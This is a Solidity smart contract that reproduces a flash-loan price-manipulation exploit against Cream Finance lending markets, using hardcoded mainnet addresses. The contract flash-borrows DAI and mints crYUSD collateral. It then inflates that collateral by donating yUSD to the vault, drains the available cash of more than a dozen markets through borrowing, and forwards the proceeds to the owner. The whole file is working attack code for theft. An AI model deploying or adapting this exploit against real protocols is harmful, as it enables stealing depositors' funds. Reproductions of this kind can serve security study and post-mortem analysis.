pragma solidity ^0.8;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Brother.sol";
import "./interfaces/IERC3156FlashBorrower.sol";
import "./interfaces/IERC3156FlashLender.sol";
import "./interfaces/IyDAI.sol";
import "./interfaces/IySwap.sol";
import "./interfaces/IyUSD.sol";
import "./interfaces/IcrYUSD.sol";
import "./interfaces/IcrETH.sol";
import "./interfaces/IUnitroller.sol";
import "./interfaces/Uniswap.sol";
import "./interfaces/IStableSwapCompound.sol";
import "./interfaces/IYVaultPeak.sol";
import "./interfaces/IWETH.sol";
import "./interfaces/IUSDT.sol";
import "./interfaces/compound/CTokenInterfaces.sol";

import "hardhat/console.sol";


contract Attack is Ownable, IERC3156FlashBorrower {
    enum Action {NORMAL, OTHER}

    Brother brother;

    IERC3156FlashLender lender = IERC3156FlashLender(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    uint256 DAI_AMOUNT = 500000000000000000000000000; // amount for flash borrow

    address yDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address ySwap = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    // Curve Y Pool yUSD (yUSD)
    address yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    // Curve.fi yDAI/yUSDC/yUSDT/yTUSD
    address fourYPool = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;
    // Cream yUSD
    address crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    address DUSD = 0x5BC25f649fc4e26069dDF4cF4010F9f706c23831;
    // Curve DUSD MetaPool. 3Pool to allow swaps between DUSD / DAI / USDC / USDT
    address DUSDPool = 0x8038C01A0390a8c547446a0b2c18fc9aEFEcc10c;
    address crETH = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address crCRETH2 = 0xfd609a03B393F1A1cFcAcEdaBf068CAD09a924E2;
    address crXSUSHI = 0x228619CCa194Fbe3Ebeb2f835eC1eA5080DaFbb2;
    address XSUSHI = 0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272;
    address crWNXM = 0xeFF039C3c1D668f408d09dD7B63008622a77532C;
    address WNXM = 0x0d438F3b5175Bebc262bF23753C1E53d03432bDE;
    address crPERP = 0x299e254A8a165bBeB76D9D69305013329Eea3a3B;
    address PERP = 0xbC396689893D065F41bc2C6EcbeE5e0085233447;
    address crRUNE = 0x8379BAA817c5c5aB929b03ee8E3c48e45018Ae41;
    address RUNE = 0x3155BA85D5F96b2d030a4966AF206230e46849cb;
    address crDPI = 0x2A537Fa9FFaea8C1A41D3C2B68a9cb791529366D;
    address DPI = 0x1494CA1F11D487c2bBe4543E90080AeBa4BA3C2b;
    address crUNI = 0xe89a6D0509faF730BD707bf868d9A2A744a363C7;
    address UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address crUSDC = 0x44fbeBd2F576670a6C33f6Fc0B00aA8c5753b322;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address crFEI = 0x8C3B7a4320ba70f8239F83770c4015B5bc4e6F91;
    address FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address crUSDT = 0x797AAB1ce7c01eB727ab980762bA88e7133d2157;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address crYVCurvestETH = 0x1F9b4756B008106C806c7E64322d7eD3B72cB284;
    address YVCurvestETH = 0xdCD90C7f6324cfa40d7169ef80b12031770B4325;
    address crGNO = 0x523EFFC8bFEfC2948211A05A905F761CBA5E8e9E;
    address GNO = 0x6810e776880C02933D47DB1b9fc05908e5386b96;
    address crFTT = 0x10FDBD1e48eE2fD9336a482D746138AE19e649Db;
    address FTT = 0x50D1c9771902476076eCFc8B2A83Ad6b9355a4c9;
    address crYGG = 0x4112a717edD051F77d834A6703a1eF5e3d73387F;
    address YGG = 0x25f8087EAD173b73D6e8B84329989A8eEA16CF73;

    // Unitroller
    address UnitrollerAddress = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address YVaultPeakProxy = 0xA89BD606d5DadDa60242E8DEDeebC95c41aD8986;

    modifier onlyBrother {
        require(msg.sender == address(brother), "Not my brother");
        _;
    }

    fallback () external payable {}

    receive () external payable {}

    function start(Brother _brother) external onlyOwner {
        brother = _brother;

        flashBorrow(DAI, DAI_AMOUNT);
        moveFunds();

        console.log('gg cream!');
    }

    function flashBorrow(address token, uint amount) internal {
        // bytes memory data = abi.encode(Action.NORMAL);
        uint256 _allowance = IERC20(token).allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(token, amount);
        uint256 _repayment = amount + _fee;
        IERC20(token).approve(address(lender), _allowance + _repayment);
        lender.flashLoan(this, token, amount, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint amount,
        uint fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(lender), "FlashBorrower: Untrusted lender");
        require(initiator == address(this), "FlashBorrower: Untrusted loan initiator");

        attack();

        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }

    function attack() internal {
        // Swap DAI for yDAI
        IERC20(DAI).approve(yDAI, DAI_AMOUNT);
        IyDAI(yDAI).deposit(DAI_AMOUNT);
        uint yDaiBalance = IERC20(yDAI).balanceOf(address(this));

        // Swap yDAI for fourYPool
        IERC20(yDAI).approve(ySwap, yDaiBalance);
        uint256[4] memory amounts = [yDaiBalance, 0, 0, 0];
        IySwap(ySwap).add_liquidity(amounts, 0);
        uint fourYPoolBalance = IERC20(fourYPool).balanceOf(address(this));

        // Swap fourYPool for yUSD
        IERC20(fourYPool).approve(yUSD, fourYPoolBalance);
        IyUSD(yUSD).deposit(fourYPoolBalance);
        uint yUSDBalance = IERC20(yUSD).balanceOf(address(this));

        // Swap yUSD for crYUSD
        IERC20(yUSD).approve(crYUSD, yUSDBalance);
        IcrYUSD(crYUSD).mint(yUSDBalance);
        // console.log('crYUSD balance %s',IERC20(crYUSD).balanceOf(address(this)));

        // Use crYUSD as collateral
        address[] memory cTokens = new address[](1);
        cTokens[0] = crYUSD;
        IUnitroller(UnitrollerAddress).enterMarkets(cTokens);

        brother.flashLoanAAVE();
        // brother contract will execute continueAttack function

        // burn 4pool tokens for yDAI
        fourYPoolBalance = IERC20(fourYPool).balanceOf(address(this));
        uint yDaiOut = 445331495265152128661273376; // how to get this number? 99% of fourYPoolBalance?
        amounts = [yDaiOut, 0, 0, 0];
        IySwap(ySwap).remove_liquidity_imbalance(amounts, fourYPoolBalance);
        // swap yDAI for DAI
        IyDAI(yDAI).withdraw(IERC20(yDAI).balanceOf(address(this)));

        // swap some USDC to DAI to pay back loan
        uint DAIToBuy = DAI_AMOUNT - IERC20(DAI).balanceOf(address(this));
        ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter.ExactOutputSingleParams({
            tokenIn: USDC,
            tokenOut: DAI,
            fee: 500,
            recipient: address(this),
            deadline: type(uint).max,
            amountInMaximum: type(uint).max,
            amountOut: DAIToBuy,
            sqrtPriceLimitX96: 0
        });
        IERC20(USDC).approve(UNISWAP_V3_ROUTER, type(uint).max);
        ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(params);

        // loan with automatically get repaid
    }

    function continueAttack() external onlyBrother {
        // Brother contract have transferred ~1B crYUSD and ~500M yUSD
        uint DUSDPOOlBalance = IERC20(DUSD).balanceOf(DUSDPool);
        uint USDCAmountToBuy = 7453002766252; // how was this number computed? dusd * 2?
        ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter.ExactOutputSingleParams({
            tokenIn: WETH,
            tokenOut: USDC,
            fee: 3000,
            recipient: address(this),
            deadline: type(uint).max,
            amountInMaximum: type(uint).max,
            amountOut: USDCAmountToBuy,
            sqrtPriceLimitX96: 0
        });
        IERC20(WETH).approve(UNISWAP_V3_ROUTER, type(uint).max);
        ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(params);
        IERC20(USDC).approve(DUSDPool, type(uint).max);
        IStableSwapCompound(DUSDPool).exchange_underlying(2, 0, USDCAmountToBuy / 2, 0);
        DUSDPOOlBalance = IERC20(DUSD).balanceOf(DUSDPool);
        uint myDUSDBalance = IERC20(DUSD).balanceOf(address(this));

        IYVaultPeak(YVaultPeakProxy).redeemInYusd(myDUSDBalance, 0);
        IyUSD(yUSD).withdraw();
        uint totalAssets = IyUSD(yUSD).totalAssets();
        // Here is the exploit: donate double existing amount yUSD to yUSD Vault.
        // This doubles the value of yUSD so crYUSD collateral have doubled in value
        IERC20(fourYPool).transfer(yUSD, totalAssets);

        // Begin stealing funds

        // borrow all ETH using crETH as collateral
        uint ethBalance = crETH.balance;
        IcrETH(crETH).borrow(ethBalance);
        // convert to WETH
        IWETH(WETH).deposit{value: ethBalance}();

        // send all WETH to brother contract so it can pay back flashloan
        IERC20(WETH).transfer(address(brother), IERC20(WETH).balanceOf(address(this)));

        // borrow crCRETH2
        uint balance = CTokenInterface(crCRETH2).getCash();
        CErc20Interface(crCRETH2).borrow(balance);

        // borrow crXSUSHI
        balance = CTokenInterface(crXSUSHI).getCash();
        CErc20Interface(crXSUSHI).borrow(balance);

        // borrow crXSUSHI
        balance = CTokenInterface(crWNXM).getCash();
        CErc20Interface(crWNXM).borrow(balance);

        // borrow crPERP
        balance = CTokenInterface(crPERP).getCash();
        CErc20Interface(crPERP).borrow(balance);

        // borrow crRUNE
        balance = CTokenInterface(crRUNE).getCash();
        CErc20Interface(crRUNE).borrow(balance);

        // borrow crDPI
        balance = CTokenInterface(crDPI).getCash();
        CErc20Interface(crDPI).borrow(balance);

        // borrow crUNI
        balance = CTokenInterface(crUNI).getCash();
        CErc20Interface(crUNI).borrow(balance);

        // borrow crUSDC
        balance = CTokenInterface(crUSDC).getCash();
        CErc20Interface(crUSDC).borrow(balance);

        // borrow crFEI
        balance = CTokenInterface(crFEI).getCash();
        CErc20Interface(crFEI).borrow(balance);

        // borrow crUSDT
        balance = CTokenInterface(crUSDT).getCash();
        CErc20Interface(crUSDT).borrow(balance);

        // borrow crYVCurve-stETH
        balance = CTokenInterface(crYVCurvestETH).getCash();
        CErc20Interface(crYVCurvestETH).borrow(balance);

        // borrow crGNO
        balance = CTokenInterface(crGNO).getCash();
        CErc20Interface(crGNO).borrow(balance);

        // borrow crFTT
        balance = CTokenInterface(crFTT).getCash();
        CErc20Interface(crFTT).borrow(balance);

        // borrow crYGG
        balance = CTokenInterface(crYGG).getCash();
        CErc20Interface(crYGG).borrow(balance);
    }

    function moveFunds() internal {
        IERC20(USDC).transfer(owner(), IERC20(USDC).balanceOf(address(this)));
        IERC20(fourYPool).transfer(owner(), IERC20(fourYPool).balanceOf(address(this)));
        IERC20(XSUSHI).transfer(owner(), IERC20(XSUSHI).balanceOf(address(this)));
        IERC20(WNXM).transfer(owner(), IERC20(WNXM).balanceOf(address(this)));
        IERC20(PERP).transfer(owner(), IERC20(PERP).balanceOf(address(this)));
        IERC20(RUNE).transfer(owner(), IERC20(RUNE).balanceOf(address(this)));
        IERC20(DPI).transfer(owner(), IERC20(DPI).balanceOf(address(this)));
        IERC20(UNI).transfer(owner(), IERC20(UNI).balanceOf(address(this)));
        IERC20(USDC).transfer(owner(), IERC20(crUSDC).balanceOf(address(this)));
        IERC20(FEI).transfer(owner(), IERC20(FEI).balanceOf(address(this)));
        IUSDT(USDT).transfer(owner(), IERC20(USDT).balanceOf(address(this))); // transfer has no return
        IERC20(YVCurvestETH).transfer(owner(), IERC20(YVCurvestETH).balanceOf(address(this)));
        IERC20(GNO).transfer(owner(), IERC20(GNO).balanceOf(address(this)));
        IERC20(FTT).transfer(owner(), IERC20(FTT).balanceOf(address(this)));
        IERC20(YGG).transfer(owner(), IERC20(YGG).balanceOf(address(this)));
    }
}